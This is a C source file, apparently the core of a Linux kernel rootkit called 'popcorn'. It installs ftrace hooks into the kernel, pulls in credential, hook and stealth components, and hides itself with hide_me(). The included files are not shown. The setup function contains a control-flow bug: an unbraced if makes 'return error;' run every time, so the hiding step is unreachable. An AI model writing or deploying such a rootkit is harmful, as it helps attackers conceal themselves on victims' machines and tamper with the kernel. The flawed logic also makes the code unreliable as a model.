#include "headers/popcorn.h"
#include "headers/ftrace_helper.h"

#include "src/credentials.c"
#include "src/hooks.c"
#include "src/stealth.c"

static int setup(void) {
    int error;
    error = fh_install_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
    if (error)
            printk(KERN_INFO "Kernels left unpopped...\n");
        return error;
    hide_me();
    return 0;
}

static int teardown(void) {
    fh_remove_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
    show_me();
    return 0;
}

static void __exit popcorn_exit(void) {
    printk(KERN_INFO "Kernels get popped eventually...\n");
    teardown();
}

static int __init popcorn_init(void) {
    #ifdef VERSION_NOT_SUPPORTED
        printk(KERN_INFO "Kernels left unpopped...\n");
        return -1;
    #endif
    setup();
    printk(KERN_INFO "Popcorns have kernels!\n");
	return 0;
}

module_init(popcorn_init);
module_exit(popcorn_exit);